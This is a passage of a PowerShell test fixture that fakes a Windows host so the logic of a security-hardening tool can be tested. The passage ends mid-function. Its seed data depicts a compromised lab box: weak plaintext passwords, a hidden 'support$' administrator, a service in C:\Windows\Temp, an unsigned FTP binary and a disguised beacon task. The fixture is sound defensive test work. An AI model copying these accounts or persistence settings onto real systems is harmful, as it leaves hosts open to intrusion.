# FakeWindows.ps1 - a PRETEND Windows box for the logic tests.
#
# It defines stand-ins for the Windows cmdlets and commands the hardening tool calls. They all read and change ONE state
# object, $global:FW, so a test can run a collector, run an action, and then look at what changed. Every stand-in
# declares the real cmdlet's parameter names, so a call with a wrong parameter name fails here like it would on Windows.
#
# What this proves: the tool's logic works when Windows behaves the way these stand-ins behave.
# What it cannot prove: that real Windows behaves this way. That part is checked in the lab (see README).
#
# Usage:  . Tests\FakeWindows.ps1 ; $global:FW = New-FakeBox     (then dot-source the tool files)

$env:SystemRoot = 'C:\Windows'
$env:COMPUTERNAME = 'ASSEMBLY-5'
$env:ProgramData = 'C:\ProgramData'
$env:APPDATA = 'C:\Users\plinktern\AppData\Roaming'
$env:TEMP = [IO.Path]::GetTempPath()
$env:SystemDrive = 'C:'

function ConvertTo-FakeSid { param([int]$Rid) "S-1-5-21-1111-2222-3333-$Rid" }
function Get-FakeKey { param([string]$Path) ($Path -replace '/', '\').TrimEnd('\').ToLowerInvariant() }

function New-FakeBox {
    # A box that looks like the lab built by Lab-Setup.ps1: planted users, sloppy firewall rules, Jenkins, a log collector.
    $b = @{}
    $b.Calls = New-Object System.Collections.ArrayList
    $b.Groups = [ordered]@{
        'Administrators' = 'S-1-5-32-544'; 'Users' = 'S-1-5-32-545'; 'Guests' = 'S-1-5-32-546'; 'Power Users' = 'S-1-5-32-547'
        'Backup Operators' = 'S-1-5-32-551'; 'Remote Desktop Users' = 'S-1-5-32-555'; 'Remote Management Users' = 'S-1-5-32-580'
    }
    $b.Users = [ordered]@{}
    $mk = {
        param($Name, $Rid, $Enabled, $Groups, $Pw, $Desc)
        $b.Users[$Name] = @{ Name = $Name; Sid = (ConvertTo-FakeSid $Rid); Enabled = $Enabled; Groups = New-Object System.Collections.ArrayList
                             Password = $Pw; Description = $Desc; LastLogon = [datetime]'2026-10-14 09:30'
                             AccountExpires = $null; PasswordExpires = $null; MustChange = $false; Locked = $false }
        foreach ($g in $Groups) { [void]$b.Users[$Name].Groups.Add($g) }
    }
    & $mk 'Administrator' 500 $true  @('Administrators') 'AdminPw1!' 'Built-in account for administering the computer'
    & $mk 'Guest'         501 $true  @('Guests')         ''          'Built-in account for guest access'
    & $mk 'DefaultAccount' 503 $false @('Users')         ''          'A user account managed by the system.'
    & $mk 'WDAGUtilityAccount' 504 $false @()            'x'         'Defender Application Guard'
    & $mk 'plinktern'     1001 $true @('Administrators', 'Remote Desktop Users') 'H00ves0nTheM00n' 'IHPL intern admin'
    & $mk 'jmoney'        1002 $true @('Remote Desktop Users') 'H00ves0nTheM00n' 'Scoring user'
    & $mk 'kkiderchah'    1003 $true @('Administrators', 'Remote Desktop Users') 'Sauce4Life!' 'CISO'
    & $mk 'jbrewer'       1004 $true @('Remote Desktop Users') 'Password1' 'Plinko Brewing'
    & $mk 'helpdesk'      1005 $true @('Administrators') 'Helpdesk1!' 'Helpdesk'
    & $mk 'svc_backup'    1006 $true @('Administrators') 'Backup2026!' 'Backup service account'
    & $mk 'old.employee'  1007 $false @('Remote Desktop Users', 'Administrators') 'Offboarded1!' 'Left the company'
    & $mk 'support$'      1008 $true @('Administrators') 'Sup0rt!Acct' 'Windows support'
    & $mk 'testuser'      1009 $true @('Users') '' 'temp test account'
    $b.Rights = [ordered]@{
        SeRemoteInteractiveLogonRight = '*S-1-5-32-544,*S-1-5-32-555'; SeDenyRemoteInteractiveLogonRight = '*S-1-5-32-546'
        SeNetworkLogonRight = '*S-1-1-0,*S-1-5-32-544,*S-1-5-32-545,*S-1-5-32-551'; SeDenyNetworkLogonRight = '*S-1-5-32-546'
    }
    $b.Lockout = 5
    $b.Services = @(
        @{ Name = 'TermService'; DisplayName = 'Remote Desktop Services'; State = 'Running'; StartMode = 'Manual'; StartName = 'NT AUTHORITY\NetworkService'; PathName = 'C:\Windows\System32\svchost.exe -k NetworkService -p'; ProcessId = 1200 }
        @{ Name = 'Spooler'; DisplayName = 'Print Spooler'; State = 'Running'; StartMode = 'Auto'; StartName = 'LocalSystem'; PathName = 'C:\Windows\System32\spoolsv.exe'; ProcessId = 1300 }
        @{ Name = 'Jenkins'; DisplayName = 'Jenkins'; State = 'Running'; StartMode = 'Auto'; StartName = 'LocalSystem'; PathName = '"C:\Program Files\Jenkins\jenkins.exe"'; ProcessId = 2400 }
        @{ Name = 'WinSvcHelper'; DisplayName = 'Windows Service Helper'; State = 'Stopped'; StartMode = 'Auto'; StartName = 'LocalSystem'; PathName = 'C:\Windows\Temp\svchelper.exe'; ProcessId = 0 }
        @{ Name = 'BackupSvc'; DisplayName = 'Nightly backup'; State = 'Running'; StartMode = 'Auto'; StartName = '.\svc_backup'; PathName = '"C:\Tools\nightly.exe"'; ProcessId = 2600 }
        @{ Name = 'otelcol'; DisplayName = 'OpenTelemetry Collector'; State = 'Running'; StartMode = 'Auto'; StartName = 'LocalSystem'; PathName = '"C:\Program Files\otelcol\otelcol-contrib.exe" --config x.yaml'; ProcessId = 2800 }
        # Defender runs from ProgramData on a real Server 2022 (the hunt must not mistake it for a planted service)
        @{ Name = 'WinDefend'; DisplayName = 'Microsoft Defender Antivirus Service'; State = 'Running'; StartMode = 'Auto'; StartName = 'LocalSystem'; PathName = '"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe"'; ProcessId = 3300 }
        @{ Name = 'WdNisSvc'; DisplayName = 'Microsoft Defender Antivirus Network Inspection Service'; State = 'Running'; StartMode = 'Manual'; StartName = 'NT AUTHORITY\LocalService'; PathName = '"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\NisSrv.exe"'; ProcessId = 3400 }
    )
    $b.Tasks = @(
        @{ TaskName = 'MicrosoftEdgeUpdateTaskCore2'; TaskPath = '\'; State = 'Ready'; UserId = 'SYSTEM'; GroupId = ''; RunLevel = 'Highest'; Execute = 'cmd.exe'; Arguments = '/c echo task-beacon' }
        @{ TaskName = 'NightlyCopy'; TaskPath = '\'; State = 'Ready'; UserId = 'ASSEMBLY-5\plinktern'; GroupId = ''; RunLevel = 'Limited'; Execute = 'C:\Tools\copy.bat'; Arguments = '' }
        @{ TaskName = 'Defrag'; TaskPath = '\Microsoft\Windows\Defrag\'; State = 'Ready'; UserId = 'SYSTEM'; GroupId = ''; RunLevel = 'Highest'; Execute = '%windir%\system32\defrag.exe'; Arguments = '-c' }
    )
    $b.Procs = @{
        4 = @{ Name = 'System'; Path = '' }; 800 = @{ Name = 'lsass'; Path = 'C:\Windows\System32\lsass.exe' }
        1200 = @{ Name = 'svchost'; Path = 'C:\Windows\System32\svchost.exe' }; 2400 = @{ Name = 'java'; Path = 'C:\Program Files\Eclipse Adoptium\jdk-17\bin\java.exe' }
        2800 = @{ Name = 'otelcol-contrib'; Path = 'C:\Program Files\otelcol\otelcol-contrib.exe' }; 3100 = @{ Name = 'ftpd'; Path = 'C:\Users\Public\ftpd.exe' }
    }
    $b.Listen = @(
        @{ Proto = 'TCP'; Addr = '0.0.0.0'; Port = 135; Pid = 1200 }; @{ Proto = 'TCP'; Addr = '0.0.0.0'; Port = 445; Pid = 4 }
        @{ Proto = 'TCP'; Addr = '0.0.0.0'; Port = 3389; Pid = 1200 }; @{ Proto = 'TCP'; Addr = '0.0.0.0'; Port = 8080; Pid = 2400 }
        @{ Proto = 'TCP'; Addr = '0.0.0.0'; Port = 21; Pid = 3100 }; @{ Proto = 'UDP'; Addr = '0.0.0.0'; Port = 123; Pid = 1200 }
    )
    $b.Conns = @(
        @{ LocalPort = 50001; RemoteAddress = '172.16.5.5'; RemotePort = 4317; Pid = 2800 }
        @{ LocalPort = 50002; RemoteAddress = '203.0.113.9'; RemotePort = 443; Pid = 3100 }
    )
    $b.Sigs = @{
        'C:\Windows\System32\lsass.exe' = @{ Status = 'Valid'; Subject = 'CN=Microsoft Windows, O=Microsoft Corporation' }
        'C:\Windows\System32\svchost.exe' = @{ Status = 'Valid'; Subject = 'CN=Microsoft Windows, O=Microsoft Corporation' }
        'C:\Program Files\Eclipse Adoptium\jdk-17\bin\java.exe' = @{ Status = 'Valid'; Subject = 'CN=Eclipse.org Foundation, Inc.' }
        'C:\Program Files\otelcol\otelcol-contrib.exe' = @{ Status = 'Valid'; Subject = 'CN=Some Vendor' }
        'C:\Users\Public\ftpd.exe' = @{ Status = 'NotSigned'; Subject = '' }
    }
    $b.FwProfiles = [ordered]@{}
    foreach ($n in 'Domain', 'Private', 'Public') {
        $b.FwProfiles[$n] = @{ Name = $n; Enabled = 'True'; DefaultInboundAction = 'Block'; DefaultOutboundAction = 'Allow'; AllowInboundRules = 'True'
                               LogBlocked = 'False'; LogAllowed = 'False'; LogFileName = '%systemroot%\system32\LogFiles\Firewall\pfirewall.log'; LogMaxSizeKilobytes = 4096 }
    }
    $b.FwRules = New-Object System.Collections.ArrayList
    $rule = {
        param($Name, $Port = 'Any', $Proto = 'TCP', $Group = '', $Program = 'Any', $Dir = 'Inbound', $Persistent = $true, $Remote = 'Any')
        [void]$b.FwRules.Add(@{ Name = $Name; DisplayName = $Name; DisplayGroup = $Group; Group = $(if ($Group) { '@FirewallAPI.dll,-25000' } else { '' }); Enabled = 'True'
                                Direction = $Dir; Action = 'Allow'; Profile = 'Any'; Protocol = $Proto; LocalPort = $Port; RemoteAddress = $Remote; Program = $Program; Persistent = $Persistent })
    }
    & $rule 'CoreNet-IPHTTPS-In' 'IPHTTPS' 'TCP' 'Core Networking'
    & $rule 'CoreNet-ICMP4-DUFRAG-In' 'Any' 'ICMPv4' 'Core Networking'
    & $rule 'CoreNet-DHCP-In' '68' 'UDP' 'Core Networking'
    & $rule 'RemoteDesktop-UserMode-In-TCP' '3389' 'TCP' 'Remote Desktop' 'C:\Windows\System32\svchost.exe'
    & $rule 'Legacy FTP' '21'; & $rule 'Telnet Test' '23'; & $rule 'Dev Web' '8000'; & $rule 'Remote Debug' '1337'
    & $rule 'WinRM Any' '5985'; & $rule 'Temp SMB' '445'; & $rule 'Jenkins 8080' '8080'
    & $rule 'GpoDeliveredRule' '9999' 'TCP' '' 'Any' 'Inbound' $false
    $b.FwExport = $null
    $b.RegKinds = @{}                                          # "path|name" -> String | ExpandString | DWord ... (only where a test cares; the rest is worked out from the data)
    $b.RegKeys = New-Object System.Collections.ArrayList       # keys that exist without any value (real Windows keeps an empty key)
    $b.Reg = @{
        'hklm:\software\microsoft\windows nt\currentversion|UBR' = 4000
        'hklm:\system\currentcontrolset\services\jenkins|Environment' = @('JENKINS_HOME=C:\ProgramData\Jenkins\.jenkins')
        'hklm:\software\microsoft\net framework setup\ndp\v4\full|Release' = 528040
        'hklm:\system\currentcontrolset\control\terminal server|fDenyTSConnections' = 0
        'hklm:\system\currentcontrolset\control\terminal server\winstations\rdp-tcp|PortNumber' = 3389
        # what a clean Server 2022 has in the places the persistence audit reads
        'hklm:\software\microsoft\windows\currentversion\run|SecurityHealth' = 'C:\Windows\system32\SecurityHealthSystray.exe'
        'hklm:\software\microsoft\windows nt\currentversion\winlogon|Shell' = 'explorer.exe'
        'hklm:\software\microsoft\windows nt\currentversion\winlogon|Userinit' = 'C:\Windows\system32\userinit.exe,'
        'hklm:\software\microsoft\windows nt\currentversion\windows|AppInit_DLLs' = ''
        'hklm:\software\microsoft\windows nt\currentversion\windows|LoadAppInit_DLLs' = 0
        'hklm:\software\wow6432node\microsoft\windows nt\currentversion\windows|AppInit_DLLs' = ''
        'hklm:\software\wow6432node\microsoft\windows nt\currentversion\windows|LoadAppInit_DLLs' = 0
        'hklm:\system\currentcontrolset\control\lsa|Authentication Packages' = @('msv1_0')
        'hklm:\system\currentcontrolset\control\lsa|Notification Packages' = @('scecli')
        'hklm:\system\currentcontrolset\control\lsa|Security Packages' = @('""')
        'hklm:\system\currentcontrolset\services\termservice\parameters|ServiceDll' = '%SystemRoot%\System32\termsrv.dll'
    }
    $b.Files = @{
        (Get-FakeKey 'C:\Program Files\Jenkins\jenkins.xml') = '<service><env name="JENKINS_HOME" value="C:\ProgramData\Jenkins\.jenkins"/><executable>C:\Program Files\Eclipse Adoptium\jdk-17\bin\java.exe</executable></service>'
        (Get-FakeKey 'C:\Program Files\Eclipse Adoptium\jdk-17\bin\java.exe') = ''
        (Get-FakeKey 'C:\ProgramData\Jenkins\.jenkins') = '<dir/>'
        (Get-FakeKey 'C:\Windows\System32\OpenSSH') = '<dir/>'
        (Get-FakeKey 'C:\Windows\System32\OpenSSH\ssh.exe') = ''
        (Get-FakeKey 'C:\Windows\System32\OpenSSH\scp.exe') = ''
        (Get-FakeKey 'C:\Windows\System32\OpenSSH\ssh-keygen.exe') = ''
        (Get-FakeKey 'C:\Windows\System32\OpenSSH\ssh-keyscan.exe') = ''
    }
    $b.Files[(Get-FakeKey 'C:\Windows\System32\drivers\etc\hosts')] = "# hosts file`r`n127.0.0.1 localhost`r`n"
    # the programs the persistence audit looks at (a file must "exist" for Test-Path; its fingerprint is in Hashes, its signature in Sigs)
    $b.Hashes = @{}
    $n = 0
    foreach ($rel in 'cmd.exe', 'WindowsPowerShell\v1.0\powershell.exe', 'sethc.exe', 'utilman.exe', 'osk.exe', 'narrator.exe', 'magnify.exe', 'displayswitch.exe', 'termsrv.dll') {
        $full = 'C:\Windows\System32\' + $rel
        $n++
        $b.Files[(Get-FakeKey $full)] = ''
        $b.Hashes[(Get-FakeKey $full)] = ('A' + $n).PadRight(64, '0')              # a different fake fingerprint for each file
        $b.Sigs[$full] = @{ Status = 'Valid'; Subject = 'CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US' }
    }
    $b.Dirs = @{ (Get-FakeKey 'C:\ProgramData\Jenkins\.jenkins\init.groovy.d') = @('lab-init.groovy')
                 (Get-FakeKey 'C:\Users') = @(@{ Name = 'plinktern'; IsDir = $true }, @{ Name = 'jmoney'; IsDir = $true }, @{ Name = 'Public'; IsDir = $true }) }
    $b.Hives = @('.DEFAULT', 'S-1-5-18', 'S-1-5-21-1111-2222-3333-1001', 'S-1-5-21-1111-2222-3333-1001_Classes', 'S-1-5-21-1111-2222-3333-1002')   # registry hives that are loaded
    $b.Wmi = @{
        Filters   = @(@{ Name = 'SCM Event Log Filter'; Query = 'select * from MSFT_SCMEventLogEvent' })
        Consumers = @(@{ Class = 'NTEventLogEventConsumer'; Name = 'SCM Event Log Consumer'; CommandLineTemplate = $null; ExecutablePath = $null; ScriptText = $null; ScriptFileName = $null })
        Bindings  = @(@{ Filter = '__EventFilter (Name = "SCM Event Log Filter")'; Consumer = 'NTEventLogEventConsumer (Name = "SCM Event Log Consumer")' })
    }
    $b.Shares = @(
        @{ Name = 'ADMIN$'; Path = 'C:\Windows'; Special = $true; Description = 'Remote Admin'; Access = @() }
        @{ Name = 'C$'; Path = 'C:\'; Special = $true; Description = 'Default share'; Access = @() }
        @{ Name = 'IPC$'; Path = ''; Special = $true; Description = 'Remote IPC'; Access = @() }
    )
    $b.Bits = @()
    $b.Feature = 'Installed'                  # Windows-Defender
    $b.Software = @(
        @{ DisplayName = 'Jenkins 2.440'; DisplayVersion = '2.440'; Publisher = 'Jenkins project'; InstallDate = '20260101' }
        @{ DisplayName = 'OpenTelemetry Collector'; DisplayVersion = '0.90'; Publisher = 'OpenTelemetry'; InstallDate = '20260102' }
    )
    $b.Natives = New-Object System.Collections.ArrayList     # every program the tool ran through Invoke-Native (reads and writes)
    $b.BrokenPrograms = @()                                   # names like 'qwinsta.exe': they fail when run
    $b.MissingRegKeys = @()                                   # keys that "reg export" cannot find
    $b.Defender = @{ Service = $true; RealTime = $true; SigAge = 1; Tamper = $true; Exclusions = @(); ExclusionExtensions = @(); ExclusionProcesses = @()
                     Mode = 'Normal'; Behavior = $true; Downloads = $true; QuickScanAge = 1; SigVersion = '1.421.100.0'; Version = '4.18.24090.11' }
    $b.Tcp = @{ '1.1.1.1:443' = $true; '172.16.5.5:22' = $true }
    $b.NetCategory = 'Private'
    $b.Ips = @('172.16.5.30')
    $b.Tasks2 = @{}                      # tasks registered by the tool (dead-man switch, watchdog): name -> task
    $b.TaskXml = @{}                     # what Export-ScheduledTask handed out: id -> the task as it was (Register-ScheduledTask -Xml puts it back)
    $b.Events = New-Object System.Collections.ArrayList     # event log entries (Add-FakeEvent): @{ Log; Id; RecordId; Time; Data; Message }
    $b.Routes = @(
        @{ DestinationPrefix = '0.0.0.0/0'; NextHop = '172.16.5.1'; InterfaceIndex = 6 }
        @{ DestinationPrefix = '172.16.5.0/24'; NextHop = '0.0.0.0'; InterfaceIndex = 6 }
        @{ DestinationPrefix = '127.0.0.0/8'; NextHop = '0.0.0.0'; InterfaceIndex = 1 }
    )
    $b.StopFails = @()                   # service names that cannot be stopped (dependent services)
    $b.Adapters = @(@{ Name = 'Ethernet0'; Status = 'Up' })
    $b
}

# ------------------------------------------------------------------ small helpers used by the stand-ins
function Add-FakeCall { param([string]$Text) [void]$global:FW.Calls.Add($Text) }
function Get-FakeUser { param([string]$Name) $global:FW.Users[$Name] }
function ConvertFrom-FakeSecure { param($Secure) (New-Object System.Net.NetworkCredential('', $Secure)).Password }
function New-FakeError { param([string]$Text) throw $Text }

# ------------------------------------------------------------------ accounts
function Get-LocalUser {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Name)
    $rows = @($global:FW.Users.Values)
    if ($Name) {
        $rows = @($rows | Where-Object { $_.Name -eq $Name })
        if ($rows.Count -eq 0) { Write-Error "User $Name was not found." -ErrorAction $ErrorActionPreference; return }
    }
    foreach ($u in $rows) {
        [pscustomobject]@{ Name = $u.Name; Enabled = $u.Enabled; SID = [pscustomobject]@{ Value = $u.Sid }; Description = $u.Description; LastLogon = $u.LastLogon
                           AccountExpires = $u.AccountExpires; PasswordExpires = $u.PasswordExpires
                           PasswordLastSet = $(if ($u.MustChange) { $null } else { [datetime]'2026-10-10 08:00' }) }
    }
}
function Get-LocalGroup {
    [CmdletBinding()] param([Parameter(Position = 0)][string]$Name, [string]$SID)
    foreach ($k in $global:FW.Groups.Keys) {
        if ($Name -and $k -ne $Name) { continue }
        if ($SID -and $global:FW.Groups[$k] -ne $SID) { continue }
        [pscustomobject]@{ Name = $k; SID = [pscustomobject]@{ Value = $global:FW.Groups[$k] } }
    }
}
function New-LocalUser {
    [CmdletBinding()]
    param([Parameter(Position = 0, Mandatory)][string]$Name, [securestring]$Password, [string]$FullName, [string]$Description,
          [switch]$AccountNeverExpires, [switch]$PasswordNeverExpires, [switch]$UserMayNotChangePassword, [switch]$Disabled, [switch]$NoPassword)
    $null = $AccountNeverExpires, $PasswordNeverExpires, $UserMayNotChangePassword, $FullName
    if ($global:FW.Users.Contains($Name)) { throw "The user $Name already exists." }
    if ($Name.Length -gt 20) { throw 'The user name is longer than 20 characters.' }
    if ($Description.Length -gt 48) { throw 'The description is longer than 48 characters.' }
    $rid = 2000 + $global:FW.Users.Count
    $pw = $(if ($NoPassword) { '' } else { ConvertFrom-FakeSecure $Password })
    $global:FW.Users[$Name] = @{ Name = $Name; Sid = (ConvertTo-FakeSid $rid); Enabled = (-not $Disabled); Groups = (New-Object System.Collections.ArrayList)
                                 Password = $pw; Description = $Description; LastLogon = $null }
    [void]$global:FW.Users[$Name].Groups.Add('Users')
    Add-FakeCall "New-LocalUser $Name"
}
function Set-LocalUser {
    [CmdletBinding()] param([Parameter(Position = 0, Mandatory)][string]$Name, [securestring]$Password, [string]$Description, [bool]$PasswordNeverExpires, [switch]$AccountNeverExpires)
    $u = Get-FakeUser $Name
    if (-not $u) { throw "User $Name was not found." }
    if ($PSBoundParameters.ContainsKey('PasswordNeverExpires') -and $PasswordNeverExpires) { $u.PasswordExpires = $null; Add-FakeCall "Set-LocalUser $Name -PasswordNeverExpires" }
    if ($AccountNeverExpires) { $u.AccountExpires = $null; Add-FakeCall "Set-LocalUser $Name -AccountNeverExpires" }
    if ($PSBoundParameters.ContainsKey('Password')) { $u.Password = ConvertFrom-FakeSecure $Password; Add-FakeCall "Set-LocalUser $Name -Password" }
    if ($PSBoundParameters.ContainsKey('Description')) { $u.Description = $Description }
}
function Enable-LocalUser { [CmdletBinding()] param([Parameter(Position = 0, Mandatory)][string]$Name) $u = Get-FakeUser $Name; if (-not $u) { throw "User $Name was not found." }; $u.Enabled = $true; Add-FakeCall "Enable-LocalUser $Name" }
function Disable-LocalUser { [CmdletBinding()] param([Parameter(Position = 0, Mandatory)][string]$Name) $u = Get-FakeUser $Name; if (-not $u) { throw "User $Name was not found." }; $u.Enabled = $false; Add-FakeCall "Disable-LocalUser $Name" }
function Add-LocalGroupMember {
    [CmdletBinding()] param([Parameter(Position = 0, Mandatory)][string]$Group, [Parameter(Position = 1, Mandatory)][string]$Member)
    if (-not $global:FW.Groups.Contains($Group)) { throw "Group $Group was not found." }
    $u = Get-FakeUser $Member
    if (-not $u) { throw "User $Member was not found." }
    if ($u.Groups -contains $Group) { Write-Error "$Member is already a member of group $Group" -ErrorAction $ErrorActionPreference; return }
    [void]$u.Groups.Add($Group); Add-FakeCall "Add-LocalGroupMember $Group $Member"
}
function Remove-LocalGroupMember {
    [CmdletBinding()] param([Parameter(Position = 0, Mandatory)][string]$Group, [Parameter(Position = 1, Mandatory)][string]$Member)
    $u = Get-FakeUser $Member
    if (-not $u) { throw "User $Member was not found." }
    if ($u.Groups -notcontains $Group) { Write-Error "$Member was not found in group $Group" -ErrorAction $ErrorActionPreference; return }
    $u.Groups.Remove($Group); Add-FakeCall "Remove-LocalGroupMember $Group $Member"
}

# ------------------------------------------------------------------ native commands (net, secedit, netsh, icacls)
function net.exe {
    $a = @($args)
    if ($a[0] -eq 'localgroup') {
        $g = $a[1]
        if (-not $global:FW.Groups.Contains($g)) { 'The specified local group does not exist.'; $global:LASTEXITCODE = 2; return }
        'Alias name     ' + $g; 'Comment        x'; ''; 'Members'; ''; '-------------------------------------------------------------------------------'
        foreach ($u in $global:FW.Users.Values) { if ($u.Groups -contains $g) { $u.Name } }
        'The command completed successfully.'; $global:LASTEXITCODE = 0
    } elseif ($a[0] -eq 'user' -and $a.Count -eq 1) {
        'User accounts for \\ASSEMBLY-5'; '-------------------------------------------------------------------------------'
        ($global:FW.Users.Keys -join '   '); 'The command completed successfully.'; $global:LASTEXITCODE = 0
    } elseif ($a[0] -eq 'user') {
        $u = Get-FakeUser $a[1]
        if ($u -and $a[2] -eq '/active:yes') { $u.Enabled = $true; $u.Locked = $false }
        if ($u -and $a[2] -eq '/expires:never') { $u.AccountExpires = $null }
        if ($u -and $a[2] -eq '/logonpasswordchg:no') { $u.MustChange = $false }
        Add-FakeCall ('net ' + ($a -join ' '))
    } elseif ($a[0] -eq 'share') {
        'Share name   Resource                        Remark'; 'C$           C:\                             Default share'; 'The command completed successfully.'; $global:LASTEXITCODE = 0
    } elseif ($a[0] -eq 'accounts') {
        if ($a[1] -match '^/lockoutthreshold:(\d+)$') { $global:FW.Lockout = [int]$Matches[1] }
        Add-FakeCall ('net ' + ($a -join ' '))
    }
}
function secedit.exe {
    $a = @($args)
    $cfg = $a[[array]::IndexOf($a, '/cfg') + 1]
    if ($a[0] -eq '/export') {
        $lines = @('[Unicode]', 'Unicode=yes', '[System Access]', "LockoutBadCount = $($global:FW.Lockout)", '[Privilege Rights]')
        foreach ($k in $global:FW.Rights.Keys) { $lines += "$k = $($global:FW.Rights[$k])" }
        Set-Content -Path $cfg -Value $lines
        Add-FakeCall 'secedit /export'
    } elseif ($a[0] -eq '/configure' -and -not $global:FW.SeceditIgnore) {
        foreach ($l in (Get-Content $cfg)) {
            if ($l -match '^\s*(Se[A-Za-z]+)\s*=\s*(.*?)\s*$') { $global:FW.Rights[$Matches[1]] = $Matches[2]; Add-FakeCall "secedit /configure $($Matches[1])=$($Matches[2])" }
        }
    }
    $global:LASTEXITCODE = 0
}
function netsh.exe {
    $a = @($args)
    Add-FakeCall ('netsh ' + ($a -join ' '))
    if ($a[1] -eq 'export') {
        $global:FW.FwExport = @{ Profiles = ($global:FW.FwProfiles | ConvertTo-Json -Depth 5); Rules = ($global:FW.FwRules | ConvertTo-Json -Depth 5) }
        Set-Content -Path $a[2] -Value 'FAKE-EXPORT'
    }
    if ($a[1] -eq 'import' -and $global:FW.FwExport) {
        $profiles = $global:FW.FwExport.Profiles | ConvertFrom-Json
        foreach ($p in $profiles.PSObject.Properties) { foreach ($q in $p.Value.PSObject.Properties) { $global:FW.FwProfiles[$p.Name][$q.Name] = $q.Value } }
        $global:FW.FwRules.Clear()
        foreach ($r in @($global:FW.FwExport.Rules | ConvertFrom-Json)) {
            $h = @{}; foreach ($q in $r.PSObject.Properties) { $h[$q.Name] = $q.Value }
            [void]$global:FW.FwRules.Add($h)
        }
    }
    $global:LASTEXITCODE = 0
}
function icacls.exe { Add-FakeCall ('icacls ' + (@($args) -join ' ')); $global:LASTEXITCODE = 0 }

# Invoke-Native replacement: the tool runs reg.exe, whoami.exe, ... through Invoke-Native. Here those "programs" are canned text, and
# net.exe / secedit.exe / netsh.exe are the stand-ins above. (Core.ps1 has the real Invoke-Native; this one is defined later, so it wins.)
function Split-FakeArguments {
    param([string]$Text)
    foreach ($m in [regex]::Matches($Text, '"([^"]*)"|(\S+)')) { if ($m.Groups[1].Success) { $m.Groups[1].Value } else { $m.Groups[2].Value } }
}
function Invoke-Native {
    param([Parameter(Mandatory)][string]$Path, [string]$Arguments = '', [int]$TimeoutSec = 60, [string]$WorkingDirectory = '')
    $null = $TimeoutSec, $WorkingDirectory
    $name = [System.IO.Path]::GetFileName(($Path -replace '\\', '/')).ToLowerInvariant()
    $a = @(Split-FakeArguments $Arguments)
    [void]$global:FW.Natives.Add("$name $Arguments")
    $global:LASTEXITCODE = 0
    $out = ''; $err = ''; $code = 0
    if ($global:FW.BrokenPrograms -contains $name) {
        return [pscustomobject]@{ ExitCode = 1; StdOut = ''; StdErr = "$name failed (fake)"; TimedOut = $false }
    }
    switch ($name) {
        'net.exe'     { $out = (& net.exe @a | Out-String); $code = $global:LASTEXITCODE }
        'secedit.exe' { $out = (& secedit.exe @a | Out-String); $code = $global:LASTEXITCODE }
        'netsh.exe'   { $out = (& netsh.exe @a | Out-String); $code = $global:LASTEXITCODE }
        'icacls.exe'  { $out = (& icacls.exe @a | Out-String); $code = $global:LASTEXITCODE }
        'whoami.exe'  { $out = "USER INFORMATION`r`nASSEMBLY-5\blaze S-1-5-21-1111-2222-3333-1010`r`n" }
        'auditpol.exe' { $out = "System audit policy`r`nCategory/Subcategory    Setting`r`nLogon/Logoff   Success`r`n" }
        'route.exe'   { $out = "IPv4 Route Table`r`n0.0.0.0  0.0.0.0  172.16.5.1  172.16.5.30  25`r`n" }
        'netstat.exe' { $out = "Active Connections`r`n  TCP    0.0.0.0:3389    0.0.0.0:0    LISTENING    1200`r`n" }
        'qwinsta.exe' { $out = " SESSIONNAME  USERNAME  ID  STATE`r`n>rdp-tcp#1  blaze  1  Active`r`n" }
        'ssh-keyscan.exe' { $out = [string]$global:FW.KeyscanOutput }          # a test sets this to what blackbox "offers"
        'gpresult.exe' {
            $i = [array]::IndexOf($a, '/h')
            if ($i -ge 0) { [System.IO.File]::WriteAllText($a[$i + 1], '<html>fake gpresult</html>') }
            $out = 'Created a report.'
        }
        'reg.exe' {
            if ($a[0] -eq 'export') {
                if ($global:FW.MissingRegKeys -contains $a[1]) { $code = 1; $err = 'ERROR: The system was unable to find the specified registry key or value.' }
                else { [System.IO.File]::WriteAllText($a[2], "Windows Registry Editor Version 5.00`r`n`r`n[$($a[1])]`r`n"); $out = 'The operation completed successfully.' }
            } else { $code = 1; $err = 'fake reg.exe only knows export' }
        }
        default { $code = 1; $err = "fake Invoke-Native does not know $name" }
    }
    [pscustomobject]@{ ExitCode = $code; StdOut = $out; StdErr = $err; TimedOut = $false }
}

# ------------------------------------------------------------------ firewall
function Get-FakeRuleObject {
    param($R)
    [pscustomobject]@{ Name = $R.Name; InstanceID = $R.Name; DisplayName = $R.DisplayName; DisplayGroup = $R.DisplayGroup; Group = $R.Group
                       Enabled = $R.Enabled; Direction = $R.Direction; Action = $R.Action; Profile = $R.Profile }
}
function Get-NetFirewallProfile {
    [CmdletBinding()] param([Parameter(Position = 0)][string[]]$Name, [string]$PolicyStore)
    foreach ($k in $global:FW.FwProfiles.Keys) {
        if ($Name -and $Name -notcontains $k) { continue }
        $o = [pscustomobject]$global:FW.FwProfiles[$k]
        if ($PolicyStore -eq 'ActiveStore' -and $global:FW.GpoProfile -and $global:FW.GpoProfile.ContainsKey($k)) {
            foreach ($p in $global:FW.GpoProfile[$k].Keys) { $o.$p = $global:FW.GpoProfile[$k][$p] }
        }
        $o
    }
}
function Set-NetFirewallProfile {
    [CmdletBinding()]
    param([Parameter(Position = 0)][Alias('Profile')][string[]]$Name, [switch]$All, [string]$PolicyStore, [string]$Enabled, [string]$DefaultInboundAction,
          [string]$DefaultOutboundAction, [string]$AllowInboundRules, [string]$LogBlocked, [string]$LogAllowed, [string]$LogFileName, [uint64]$LogMaxSizeKilobytes)
    $null = $PolicyStore
    if (-not $All -and -not $Name) { throw 'Set-NetFirewallProfile needs -Name or -All.' }
    foreach ($k in @($global:FW.FwProfiles.Keys)) {
        if (-not $All -and $Name -notcontains $k) { continue }
        foreach ($p in 'Enabled', 'DefaultInboundAction', 'DefaultOutboundAction', 'AllowInboundRules', 'LogBlocked', 'LogAllowed', 'LogFileName', 'LogMaxSizeKilobytes') {
            if ($PSBoundParameters.ContainsKey($p)) { $global:FW.FwProfiles[$k][$p] = $PSBoundParameters[$p] }
        }
        Add-FakeCall "Set-NetFirewallProfile $k"
    }
}
function Get-NetFirewallRule {
    [CmdletBinding()]
    param([Parameter(Position = 0)][string[]]$Name, [string]$DisplayName, [string]$PolicyStore = 'PersistentStore', [string]$Direction, [string]$Enabled, [string]$Action)
    $found = 0
